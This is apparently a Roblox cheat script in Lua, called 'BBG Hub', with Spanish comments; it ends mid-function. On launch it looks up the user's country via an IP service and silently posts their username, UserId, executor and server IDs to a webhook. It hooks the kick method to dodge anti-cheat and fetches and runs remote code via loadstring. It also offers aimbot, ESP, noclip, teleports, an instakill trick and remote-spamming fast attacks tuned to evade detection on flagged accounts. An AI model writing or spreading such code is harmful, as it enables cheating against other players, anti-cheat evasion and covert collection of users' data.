
-- =========================================================
-- â™¾ï¸BBG Hub â™¾ï¸ |
-- =========================================================
  
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")


repeat task.wait() until Players.LocalPlayer
local player = Players.LocalPlayer
  
-- ðŸ“Š contador local
getgenv().execCount = (getgenv().execCount or 0) + 1
  
-- ðŸŒ paÃ­s
local country = "Unknown"
pcall(function()
local res = request({
Url = "http://ip-api.com/json",
Method = "GET"
})
local data = HttpService:JSONDecode(res.Body)
country = data.country or "Unknown"
end)
  
-- ðŸ§ executor
local executor = "Unknown"


if identifyexecutor then
executor = identifyexecutor()
elseif syn then
executor = "Synapse X"
elseif fluxus then
executor = "Fluxus"
elseif KRNL_LOADED then
executor = "KRNL"
end
  
-- ðŸš« blacklist (ejemplo)
local blacklist = {
[123456] = true -- mete userIds aquÃ­
}
  
if blacklist[player.UserId] then
return
end
  
-- ðŸš¨ anti-spam (si ejecuta muchas veces)


local spamAlert = ""
if getgenv().execCount > 3 then
spamAlert = "\nðŸš¨ POSIBLE SPAM"
end
  
-- ðŸ“¡ MENSAJE
local data = {
content =
"@everyone ðŸš€ Script ejecutado\n" ..
"ðŸ‘¤ Usuario: " .. player.Name .. "\n" ..
"ðŸ†” UserId: " .. player.UserId .. "\n" ..
"ðŸŒ PaÃ­s: " .. country .. "\n" ..
"ðŸ§ Executor: " .. executor .. "\n" ..
"ðŸŽ® PlaceId: " .. game.PlaceId .. "\n" ..
"ðŸ–¥ JobId: " .. game.JobId .. "\n" ..
"ðŸ“Š Veces: " .. getgenv().execCount ..
spamAlert .. "\n" ..
"â° Hora: " .. os.date("%X"),
  
allowed_mentions = {


parse = {"everyone"}
}
}
  
request({
Url = "",
Method = "POST",
Headers = {
["Content-Type"] = "application/json"
},
Body = HttpService:JSONEncode(data)
})
  
-- [1] BYPASSES Y PROTECCIONES
repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Util")


local ss = require(game:GetService("ReplicatedStorage").Util.CameraShaker.Main)
local xx = function() return nil end
ss.StartShake = xx; ss.ShakeOnce = xx; ss.ShakeSustain = xx; ss.CamerShakeInstance = xx; ss.Shake = xx; ss.Start = xx
  
pcall(function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
  
local function Rejoin()
if #Players:GetPlayers() <= 1 then
TeleportService:Teleport(game.PlaceId, LocalPlayer)
else


TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end
end
  
local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(Self, ...)
local Method = getnamecallmethod()
if (Method == "Kick" or Method == "kick") and Self == LocalPlayer then
task.spawn(Rejoin)
return nil
end
return OldNamecall(Self, ...)
end))
  
GuiService.ErrorMessageChanged:Connect(function()
if GuiService:GetErrorMessage() ~= "" then 


Rejoin() end
end)
end)
  
-- // Servicios
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
  
-- // Variables de Control
local MasterEnabled = false
local AutoSkillEnabled = false
local MaxDistance = 500
local FOV_Radius = 150


-- // FunciÃ³n para detectar enemigo
local function GetClosestPlayer()
local Target = nil
local ShortestDistance = FOV_Radius
  
for _, player in pairs(Players:GetPlayers()) do
if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
local hrp = player.Character.HumanoidRootPart
local distFromMe = (LocalPlayer.Character.HumanoidRootPart.Position - hrp.Position).Magnitude
  
if distFromMe <= MaxDistance then
local pos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
if onScreen then


local mousePos = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
local distFromCenter = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
if distFromCenter < ShortestDistance then
Target = hrp
ShortestDistance = distFromCenter
end
end
end
end
end
return Target
end
  
-- // LÃ“GICA DE LA MACRO XZ (FIXED)
UserInputService.InputBegan:Connect(function(input)
if not AutoSkillEnabled then return end


if input.KeyCode == Enum.KeyCode.R then
local isShiftLock = UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter
  
if isShiftLock then
task.spawn(function()
-- EJECUCIÃ“N DE X
VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.X, false, game)
task.wait(0.05) -- Tiempo suficiente para que el juego registre "Presionado"
VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.X, false, game)
  
-- TIEMPO DE ESPERA ENTRE HABILIDADES
-- Si solo sale la X, aumenta este nÃºmero (ej: 0.15)
task.wait(0.1)


-- EJECUCIÃ“N DE Z
VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Z, false, game)
task.wait(0.05)
VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Z, false, game)
end)
end
end
end)
  
-- // Bucle Principal (Aimbot InstantÃ¡neo)
RunService.RenderStepped:Connect(function()
local isShiftLock = UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter
  
if MasterEnabled and isShiftLock then
local target = GetClosestPlayer()


if target then
Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Position)
end
end
end)
  
-- [ FUNCIÃ“N DE TELEPORT AL BARCO EMBRUJADO - SEA 2 ]
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
  
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
  
local isHealing = false
local returnPos = nil


UserInputService.InputBegan:Connect(function(input, gp)
if gp then return end
if input.KeyCode == Enum.KeyCode.O then
pcall(function()
local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if hrp then
if not isHealing then
isHealing = true
returnPos = hrp.CFrame
hrp.CFrame = CFrame.new(923.212, 125.103, 32852.832)
else
if returnPos then
hrp.CFrame = returnPos
end
isHealing = false


end
end
end)
end
end)
  
-- [2] VARIABLES Y SERVICIOS
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
  
local FastAttackEnabled = false
local FastAttackRange = 12000


local FruitAttack = false
local InfiniteJumpEnabled = false
local InstakillActive = false
local GodModeEnabled = true
local TeleportEnabled = false
local PredictionStrength = 0
local ESPMaxDistance = 99999999
local TOGGLE_KEY = Enum.KeyCode.U
local autoV4 = false
  
-- Fix de Infinite Jump (Forzado de Velocidad)
UserInputService.JumpRequest:Connect(function()
if InfiniteJumpEnabled then
local char = LocalPlayer.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
local hum = char and char:FindFirstChildOfClass("Humanoid")


if hrp and hum then
-- Forzamos la velocidad vertical del salto
hrp.Velocity = Vector3.new(hrp.Velocity.X, hum.JumpPower, hrp.Velocity.Z)
end
end
end)
  
-- Vuelo hacia arriba al mantener Espacio
local SpaceHeld = false
  
UserInputService.InputBegan:Connect(function(input, gp)
if gp then return end
if input.KeyCode == Enum.KeyCode.Space then
SpaceHeld = true
end
end)
  
UserInputService.InputEnded:Connect(function(i


nput)
if input.KeyCode == Enum.KeyCode.Space then
SpaceHeld = false
end
end)
  
RunService.Heartbeat:Connect(function()
if InfiniteJumpEnabled and SpaceHeld then
local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if hrp then
-- Aplica velocidad hacia arriba (ajusta el 50 para ir mÃ¡s rÃ¡pido o lento)
hrp.Velocity = Vector3.new(hrp.Velocity.X, 50, hrp.Velocity.Z)
end
end
end)


local RunService = game:GetService("RunService")
local Noclip = false
local NoclipConnection
  
-- FunciÃ³n para manejar el estado del Noclip
local function SetNoclip(state)
Noclip = state
if Noclip then
-- ConexiÃ³n que desactiva colisiones en cada frame
NoclipConnection = RunService.Stepped:Connect(function()
local character = game.Players.LocalPlayer.Character
if character and Noclip then
for _, part in pairs(character:GetDescendants()) do
if part:IsA("BasePart") then
part.CanCollide = false


end
end
end
end)
else
-- Desconectar y devolver colisiones
if NoclipConnection then
NoclipConnection:Disconnect()
NoclipConnection = nil
end
local character = game.Players.LocalPlayer.Character
if character then
for _, part in pairs(character:GetDescendants()) do
if part:IsA("BasePart") then
part.CanCollide = true
end
end
end


end
end
  
-- ConfiguraciÃ³n WalkSpeed GLOBAL
_G.WalkSpeedValue = 40
_G.WalkSpeedEnabled = false
  
local FastAttackConnection = nil
local FruitAttackConnection = nil
local FruitAttackConnection1 = nil
local FruitAttackConnection12 = nil
local FruitAttackConnection16662 = nil
local SelectedPlayer = nil
local InstaTpConnection = nil
local ActiveTween = nil
local TeleportConnection = nil
local YOffset = 0
  
local Net = ReplicatedStorage:WaitForChild("Modules"):Wait


ForChild("Net")
local RegisterHit = Net["RE/RegisterHit"]
local RegisterAttack = Net["RE/RegisterAttack"]
  
-- [LÃ“GICA DE MOVIMIENTO TWEEN VEL 200]
local function SetNoCollide(v)
pcall(function()
for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
if part:IsA("BasePart") then part.CanCollide = not v end
end
end)
end
  
local function StartTeleporting()
if TeleportConnection then TeleportConnection:Disconnect() end
TeleportConnection = 


RunService.Heartbeat:Connect(function()
if not TeleportEnabled or not SelectedPlayer then return end
local target = Players:FindFirstChild(SelectedPlayer)
if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
local myHRP = LocalPlayer.Character.HumanoidRootPart
local targetHRP = target.Character.HumanoidRootPart
local targetPos = targetHRP.Position + Vector3.new(0, YOffset, 0)
local dist = (myHRP.Position - targetPos).Magnitude
if dist > 2 then
SetNoCollide(true)


local speed = 200
local time = dist / speed
if ActiveTween then ActiveTween:Cancel() end
ActiveTween = TweenService:Create(myHRP, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = CFrame.new(targetPos)})
ActiveTween:Play()
end
end
end)
end
  
-- LÃ“GICA DE WALKSPEED (RENDERSTEPPED PARA QUE FUNCIONE SIEMPRE)
RunService.RenderStepped:Connect(function()
if _G.WalkSpeedEnabled then
pcall(function()
local char = LocalPlayer.Character
local hum = char and char:FindFirstChildOfClass("Humanoid")


if hum then
hum.WalkSpeed = _G.WalkSpeedValue
end
end)
end
end)
  
-- Flags de control
local AutoHealActive = true
local isHealing = false
local returnPos = nil
  
-- [3] FUNCIONES DE ATAQUE (ORIGINALES)
local function FireAttack(targets)
if #targets == 0 then return end
RegisterAttack:FireServer(0)
RegisterHit:FireServer(targets[1][2], targets)
end
  
local function StartFastAttack()


if FastAttackConnection then FastAttackConnection:Disconnect() end
FastAttackConnection = RunService.Heartbeat:Connect(function()
if not FastAttackEnabled then return end
local char = LocalPlayer.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
if not hrp then return end
local origin = hrp.Position
local range = FastAttackRange
local targets = {}
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LocalPlayer then
local c = plr.Character
local hum = c and c:FindFirstChildOfClass("Humanoid")
local h = c and c:FindFirstChild("Head")
local r = c and c:FindFirstChild("HumanoidRootPart")


if hum and hum.Health > 0 and h and r and (r.Position - origin).Magnitude <= range then
targets[#targets+1] = {c, h}
end
end
end
local enemies = workspace:FindFirstChild("Enemies")
if enemies then
for _, npc in ipairs(enemies:GetChildren()) do
local hum = npc:FindFirstChildOfClass("Humanoid")
local h = npc:FindFirstChild("Head")
local r = npc:FindFirstChild("HumanoidRootPart")
if hum and hum.Health > 0 and h and r and (r.Position - origin).Magnitude <= range then
targets[#targets+1] = {npc, h}
end
end
end


if #targets > 0 then FireAttack(targets) end
end)
end
  
local function StopFastAttack()
if FastAttackConnection then FastAttackConnection:Disconnect(); FastAttackConnection = nil end
end
  
local function GetPlayerList()
local list = {}
for _, p in pairs(Players:GetPlayers()) do
if p ~= LocalPlayer then table.insert(list, p.Name) end
end
return #list == 0 and {"None"} or list
end
  
local function GetNearestPlayer()


local nearest, dist = nil, math.huge
local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if not myHRP then return nil end
for _, v in pairs(Players:GetPlayers()) do
if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
local d = (myHRP.Position - v.Character.HumanoidRootPart.Position).Magnitude
if d < dist then dist = d; nearest = v end
end
end
return nearest
end
  
local function StartFastAttack()
if FastAttackConnection then 


FastAttackConnection:Disconnect() end
FastAttackConnection = RunService.Heartbeat:Connect(function()
if not FastAttackEnabled then return end
local char = LocalPlayer.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
if not hrp then return end
  
local origin = hrp.Position
local range = FastAttackRange
local targets = {}
  
-- [A] TARGET: JUGADORES
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LocalPlayer then
local c = plr.Character
local hum = c and c:FindFirstChildOfClass("Humanoid")
local r = c and 


c:FindFirstChild("HumanoidRootPart")
if hum and hum.Health > 0 and r and (r.Position - origin).Magnitude <= range then
table.insert(targets, {c, c:FindFirstChild("Head") or r})
end
end
end
  
-- [B] TARGET: ENEMIGOS ESTÃNDAR
local enemies = workspace:FindFirstChild("Enemies")
if enemies then
for _, npc in ipairs(enemies:GetChildren()) do
local hum = npc:FindFirstChildOfClass("Humanoid")
local r = npc:FindFirstChild("HumanoidRootPart")
if hum and hum.Health > 0 and r and (r.Position - origin).Magnitude <= range then
table.insert(targets, {npc, 


npc:FindFirstChild("Head") or r})
end
end
end
  
-- [C] TARGET: LEVIATHAN Y COLAS (NUEVO)
-- Buscamos en todo el workspace por modelos que contengan "Leviathan" o "Tail"
for _, obj in ipairs(workspace:GetChildren()) do
if obj.Name:find("Leviathan") or obj.Name:find("Tail") or obj.Name:find("Segment") then
local hum = obj:FindFirstChildOfClass("Humanoid")
local r = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChild("LowerTorso")
if hum and hum.Health > 0 and r and (r.Position - origin).Magnitude <= range then
table.insert(targets, {obj, r})
end


end
end
  
if #targets > 0 then FireAttack(targets) end
end)
end
  
-- [ VARIABLES DE CONTROL ]
local BBGAtack2Enabled = false
local BBGRange = 3000
local MaxTargetsPerFrame = 8 -- LÃ­mite para evitar kicks en cuentas flagged
  
-- [ LISTA DE OBJETIVOS ESPECIALES ]
local SPECIAL_TARGETS = {
"Leviathan", "Tail", "Segment", "Tongue", "Head", -- Leviathan Parts
"Sea Beast", "TerrorShark", "Piranha", "Ship Wright", -- Sea Events
"Ghost Ship", "Fishman", "Boss", "NPC" -- Raids & 


Bosses
}
  
-- [ VARIABLES OPTIMIZADAS PARA CUENTAS FLAGGED ]
local BBGAtack2Enabled = false
local BBGRange = 3000
local AttackSpeed = 0.0 --
local LastAttack = 0
  
local function StartBBGAtack2()
if BBGAtack2Connection then BBGAtack2Connection:Disconnect() end
  
BBGAtack2Connection = RunService.Heartbeat:Connect(function()
if not BBGAtack2Enabled then return end
  
-- Control de velocidad para evitar detecciÃ³n de "Spam"


if tick() - LastAttack < AttackSpeed then return end
  
local char = LocalPlayer.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
if not hrp then return end
  
local targets = {}
  
-- Escaneo eficiente
for _, v in ipairs(workspace:GetChildren()) do
-- Filtro de objetivos (Leviathan, Sea Events, NPCs)
local isTarget = false
for _, name in ipairs(SPECIAL_TARGETS) do
if string.find(v.Name, name) then isTarget = true break end
end


if isTarget or (v:FindFirstChildOfClass("Humanoid") and v.Name ~= LocalPlayer.Name) then
local hum = v:FindFirstChildOfClass("Humanoid")
local tRoot = v:FindFirstChild("HumanoidRootPart") or v:FindFirstChild("Head")
  
if hum and hum.Health > 0 and tRoot then
local dist = (hrp.Position - tRoot.Position).Magnitude
if dist <= BBGRange then
table.insert(targets, {v, tRoot})
if #targets >= 5 then break end -- No le pegues a mÃ¡s de 5 a la vez
end
end
end
end


if #targets > 0 then
LastAttack = tick() -- Reinicia el temporizador de bypass
pcall(function()
-- El bypass de "FireAttack"
RegisterAttack:FireServer(0)
RegisterHit:FireServer(targets[1][2], targets)
end)
end
end)
end
  
-- LÃ³gica de Noclip (Corre en segundo plano)
game:GetService("RunService").Stepped:Connect(function()
if noclip and player.Character then
for _, part in pairs(player.Character:GetDescendants()) do
if part:IsA("BasePart") then
part.CanCollide = false


end
end
end
end)
  
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
  
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
  
local ESP_Enabled = false
local Box_Color = Color3.fromRGB(0, 162, 255) -- Tu azul neÃ³n
local ESP_Objects = {}


-- FunciÃ³n para crear los dibujos (invisible hasta que se activa)
local function CreateESP(player)
local Box = Drawing.new("Square")
Box.Visible = false
Box.Color = Box_Color
Box.Thickness = 1.5 -- LÃ­nea fina para que sea discreto
Box.Transparency = 1
Box.Filled = false
  
local Name = Drawing.new("Text")
Name.Visible = false
Name.Color = Color3.new(1, 1, 1)
Name.Size = 14
Name.Center = true
Name.Outline = true
  
ESP_Objects[player] = {Box = Box, Name = Name}
end


-- Limpieza al salir
local function RemoveESP(player)
if ESP_Objects[player] then
ESP_Objects[player].Box:Remove()
ESP_Objects[player].Name:Remove()
ESP_Objects[player].Distance:Remove() -- Si tenÃ­as distancia antes
ESP_Objects[player] = nil
end
end
  
-- Bucle de renderizado suave
RunService.RenderStepped:Connect(function()
for _, player in pairs(Players:GetPlayers()) do
local drawings = ESP_Objects[player]
if not drawings then
if player ~= LocalPlayer then CreateESP(player) end
continue


end
  
local char = player.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
local hum = char and char:FindFirstChild("Humanoid")
  
if ESP_Enabled and hrp and hum and hum.Health > 0 then
-- Calculamos la posiciÃ³n superior (cabeza) e inferior (pies)
local hrpPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
  
if onScreen then
-- Calculamos el tamaÃ±o basado en la perspectiva de la cÃ¡mara
-- Esto hace que la caja sea del tamaÃ±o exacto del personaje


local headPos = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 3, 0))
local legPos = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, -3.5, 0))
  
local height = math.abs(headPos.Y - legPos.Y)
local width = height / 2 -- RelaciÃ³n de aspecto humana estÃ¡ndar
  
-- Actualizar Caja
drawings.Box.Visible = true
drawings.Box.Size = Vector2.new(width, height)
drawings.Box.Position = Vector2.new(hrpPos.X - width / 2, hrpPos.Y - height / 2)
  
-- Actualizar Nombre arriba de la caja
drawings.Name.Visible = true
drawings.Name.Text = player.Name


drawings.Name.Position = Vector2.new(hrpPos.X, hrpPos.Y - height / 2 - 15)
else
drawings.Box.Visible = false
drawings.Name.Visible = false
end
else
drawings.Box.Visible = false
drawings.Name.Visible = false
end
end
end)
  
-- FunciÃ³n para crear los dibujos (invisible hasta que se activa)
local function CreateESP(player)
local Box = Drawing.new("Square")
Box.Visible = false
Box.Color = Box_Color
Box.Thickness = 1.5 -- LÃ­nea fina para que sea 


discreto
Box.Transparency = 1
Box.Filled = false
  
local Name = Drawing.new("Text")
Name.Visible = false
Name.Color = Color3.new(1, 1, 1)
Name.Size = 14
Name.Center = true
Name.Outline = true
  
ESP_Objects[player] = {Box = Box, Name = Name}
end
  
-- Limpieza al salir
local function RemoveESP(player)
if ESP_Objects[player] then
ESP_Objects[player].Box:Remove()
ESP_Objects[player].Name:Remove()
ESP_Objects[player].Distance:Remove() -- Si tenÃ­


as distancia antes
ESP_Objects[player] = nil
end
end
  
-- Bucle de renderizado suave
RunService.RenderStepped:Connect(function()
for _, player in pairs(Players:GetPlayers()) do
local drawings = ESP_Objects[player]
if not drawings then
if player ~= LocalPlayer then CreateESP(player) end
continue
end
  
local char = player.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
local hum = char and char:FindFirstChild("Humanoid")


if ESP_Enabled and hrp and hum and hum.Health > 0 then
-- Calculamos la posiciÃ³n superior (cabeza) e inferior (pies)
local hrpPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
  
if onScreen then
-- Calculamos el tamaÃ±o basado en la perspectiva de la cÃ¡mara
-- Esto hace que la caja sea del tamaÃ±o exacto del personaje
local headPos = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 3, 0))
local legPos = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, -3.5, 0))


local height = math.abs(headPos.Y - legPos.Y)
local width = height / 2 -- RelaciÃ³n de aspecto humana estÃ¡ndar
  
-- Actualizar Caja
drawings.Box.Visible = true
drawings.Box.Size = Vector2.new(width, height)
drawings.Box.Position = Vector2.new(hrpPos.X - width / 2, hrpPos.Y - height / 2)
  
-- Actualizar Nombre arriba de la caja
drawings.Name.Visible = true
drawings.Name.Text = player.Name
drawings.Name.Position = Vector2.new(hrpPos.X, hrpPos.Y - height / 2 - 15)
else
drawings.Box.Visible = false
drawings.Name.Visible = false
end
else


drawings.Box.Visible = false
drawings.Name.Visible = false
end
end
end)
  
-- [4] INTERFAZ RAYFIELD
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
Name = "â™¾ï¸ BBG Hub â™¾ï¸| â¤ï¸BBG Hubâ¤ï¸",
LoadingTitle = "BBG Hub Loading...",
ConfigurationSaving = {Enabled = false},
KeySystem = false
})
  
local Tab1 = Window:CreateTab("ðŸ”¥ BBG Combat ðŸ”¥", 4483362458)
local Tab2 = Window:CreateTab("â¤ï¸Aimbot | 


BBG Hubâ¤ï¸", 4483362458)
local Tab3 = Window:CreateTab("â™¾ï¸UpDownPlayersâ™¾ï¸", 4483362458)
local Tab4 = Window:CreateTab("ðŸš¢ AntiBuddha ðŸš¢", 4483362458)
local Tab5 = Window:CreateTab("âš™ï¸ Misc âš™ï¸", 4483362458)
local TabESP = Window:CreateTab("ðŸš¨ ESP ðŸš¨", 4483362458)
  
Tab1:CreateSection("--- Exploits de Movimiento ---")
local InstakillToggle = Tab1:CreateToggle({
Name = "â˜ ï¸BBG Killâ˜ ï¸",
CurrentValue = false,
Callback = function(v)
InstakillActive = v
if v then
task.spawn(function()


while InstakillActive do
local char = LocalPlayer.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
if hrp then
local pos = hrp.Position
hrp.CFrame = CFrame.new(pos.X, pos.Y - 1e15, pos.Z)
end
task.wait(0.01)
end
end)
end
end
})
  
Tab1:CreateToggle({
Name = "ðŸ˜‡JumpInfðŸ˜‡",
CurrentValue = false,
Callback = function(v) InfiniteJumpEnabled = v 


end
})
  
Tab1:CreateSection("Fast | Attacks")
  
Tab1:CreateToggle({
Name="ðŸ’¢BBG | PaiðŸ’¢n",
CurrentValue=false,
Callback=function(vatt1)
FruitAttack = vatt1
if vatt1 then
if FruitAttackConnection1 then task.cancel(FruitAttackConnection1) end
FruitAttackConnection1 = task.spawn(function()
while FruitAttack do
task.wait(0.01)
local targetPlayer = GetNearestPlayer()
if targetPlayer and targetPlayer.Character then
local attack67 = LocalPlayer.Character.HumanoidRootPart


local theother67 = targetPlayer.Character.HumanoidRootPart
if attack67 and theother67 then
local direction = (theother67.Position - attack67.Position).Unit
local args = {vector.create(direction.X, 0, direction.Z), 1, true}
LocalPlayer.Character:WaitForChild("Pain-Pain"):WaitForChild("LeftClickRemote"):FireServer(unpack(args))
end
end
end
end)
else
if FruitAttackConnection1 then task.cancel(FruitAttackConnection1); FruitAttackConnection1 = nil end
end
end,


})
  
Tab1:CreateToggle({
Name="ðŸ‰BBG | DragonðŸ‰",
CurrentValue=false,
Callback=function(vatt1233)
FruitAttack = vatt1233
if vatt1233 then
if FruitAttackConnection12 then task.cancel(FruitAttackConnection12) end
FruitAttackConnection12 = task.spawn(function()
while FruitAttack do
task.wait(0.01)
local targetPlayer = GetNearestPlayer()
if targetPlayer and targetPlayer.Character then
local attack67 = LocalPlayer.Character.HumanoidRootPart
local theother67 = targetPlayer.Character.HumanoidRootPart


if attack67 and theother67 then
local direction = (theother67.Position - attack67.Position).Unit
local args = {vector.create(direction.X, direction.Y, direction.Z), 1}
LocalPlayer.Character:WaitForChild("Dragon-Dragon"):WaitForChild("LeftClickRemote"):FireServer(unpack(args))
end
end
end
end)
else
if FruitAttackConnection12 then task.cancel(FruitAttackConnection12); FruitAttackConnection12 = nil end
end
end,
})


Tab1:CreateToggle({
Name="ðŸ…BBG | TigerðŸ…",
CurrentValue=false,
Callback=function(vatt1233)
FruitAttack = vatt1233
if vatt1233 then
if FruitAttackConnection12 then task.cancel(FruitAttackConnection12) end
FruitAttackConnection12 = task.spawn(function()
while FruitAttack do
task.wait(0.01)
local targetPlayer = GetNearestPlayer()
if targetPlayer and targetPlayer.Character then
local attack67 = LocalPlayer.Character.HumanoidRootPart
local theother67 = targetPlayer.Character.HumanoidRootPart
if attack67 and theother67 then
local direction = (theother67.Position - 


attack67.Position).Unit
local args = {vector.create(direction.X, direction.Y, direction.Z), 3}
LocalPlayer.Character:WaitForChild("Tiger-Tiger"):WaitForChild("LeftClickRemote"):FireServer(unpack(args))
end
end
end
end)
else
if FruitAttackConnection12 then task.cancel(FruitAttackConnection12); FruitAttackConnection12 = nil end
end
end,
})
  
Tab1:CreateToggle({
Name="ðŸ¦–BBG | T-rexðŸ¦–",


CurrentValue=false,
Callback=function(vatt123367676713)
FruitAttack = vatt123367676713
if vatt123367676713 then
if FruitAttackConnection16662 then task.cancel(FruitAttackConnection16662) end
FruitAttackConnection16662 = task.spawn(function()
while FruitAttack do
task.wait(0.00)
local targetPlayer = GetNearestPlayer()
if targetPlayer and targetPlayer.Character then
local attack67 = LocalPlayer.Character.HumanoidRootPart
local theother67 = targetPlayer.Character.HumanoidRootPart
if attack67 and theother67 then
local direction = (theother67.Position - attack67.Position).Unit
local args = {vector.create(direction.X, 


direction.Y, direction.Z), 1}
LocalPlayer.Character:WaitForChild("T-Rex-T-Rex"):WaitForChild("LeftClickRemote"):FireServer(unpack(args))
end
end
end
end)
else
if FruitAttackConnection16662 then task.cancel(FruitAttackConnection16662); FruitAttackConnection16662 = nil end
end
end,
})
  
Tab1:CreateToggle({
Name="ðŸ¦ŠBBG | KitsuneðŸ¦Š",
CurrentValue=false,
Callback=function(vatt)


FruitAttack = vatt
if vatt then
FruitAttackConnection = task.spawn(function()
while FruitAttack do
task.wait(0.001)
local targetPlayer = GetNearestPlayer()
if targetPlayer and targetPlayer.Character then
local tool = LocalPlayer.Character:FindFirstChild("Kitsune-Kitsune")
if tool then
local direction = (targetPlayer.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
pcall(function() tool:WaitForChild("LeftClickRemote"):FireServer(direction, 1, true) end)
end


end
end
end)
else
if FruitAttackConnection then task.cancel(FruitAttackConnection) end
end
end,
})
  
local FastAttackToggle = Tab1:CreateToggle({
Name = "ðŸ”¥BBG AttckðŸ’§",
CurrentValue = false,
Callback = function(v)
FastAttackEnabled = v
if v then StartFastAttack() else StopFastAttack() end
end
})


Tab1:CreateSlider({
Name = "â˜„ï¸BBG Rangeâ˜„ï¸",
Range = {0, 3000},
Increment = 100,
CurrentValue = 2048,
Callback = function(Value) BBGRange = Value end,
})
  
Tab1:CreateSlider({
Name = "â˜¢ï¸Attack Rangeâ˜¢ï¸",
Range = {0, 20000}, Increment = 100, CurrentValue = 12000,
Callback = function(Value) FastAttackRange = Value end,
})
  
Tab1:CreateToggle({
Name = "ðŸ”¹HITBOXðŸ”¹", CurrentValue = false,
Callback = function(v) getgenv().HitboxExpander 


= v end
})
Tab2:CreateSection("--- FuncionesAimbot ---")
Tab2:CreateToggle({
Name = "ðŸ–±ï¸Aimbot (ShiftLock)ðŸ–±ï¸",
CurrentValue = false,
Callback = function(Value) MasterEnabled = Value end,
})
  
Tab2:CreateToggle({
Name = "âœï¸Macro XZâœï¸",
CurrentValue = false,
Callback = function(Value) AutoSkillEnabled = Value end,
})
  
Tab2:CreateSlider({
Name = "â˜„ï¸Distancia MÃ¡ximaâ˜„ï¸",
Range = {50, 1500},


Increment = 50,
CurrentValue = 500,
Callback = function(Value) MaxDistance = Value end,
})
  
Tab2:CreateSlider({
Name = "ðŸŒ€Radio FOV (Invisible)ðŸŒ€",
Range = {50, 800},
Increment = 10,
CurrentValue = 150,
Callback = function(Value) FOV_Radius = Value end,
})
  
-- ðŸŸ£ TAB UPDOWNS (ORIGINAL)
local PlayerDropdown = Tab3:CreateDropdown({
Name = "ðŸ‘¤Player SelectionðŸ‘¤",
Options = GetPlayerList(),
CurrentOption = {"None"},


Callback = function(opt)
if type(opt) == "table" then opt = opt[1] end
SelectedPlayer = (opt ~= "None") and opt or nil
end,
})
  
Tab3:CreateToggle({
Name = "ðŸŒInsta TpðŸŒ",
CurrentValue = false,
Callback = function(v)
InstaTeleportEnabled = v
if v then
InstaTpConnection = RunService.Stepped:Connect(function()
if SelectedPlayer then
pcall(function()
local target = Players:FindFirstChild(SelectedPlayer)
if target and target.Character then
local targetTorso = 


target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("UpperTorso")
local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if targetTorso and myHRP then
myHRP.CFrame = targetTorso.CFrame * CFrame.new(0, YOffset, 0.2)
myHRP.Velocity = Vector3.new(0,0,0)
end
end
end)
end
end)
else
if InstaTpConnection then InstaTpConnection:Disconnect() end
end
end,
})


Tab3:CreateToggle({
Name = "ðŸ‘ï¸Spectate PlayerðŸ‘ï¸",
CurrentValue = false,
Callback = function(v)
SpectateEnabled = v
if v then
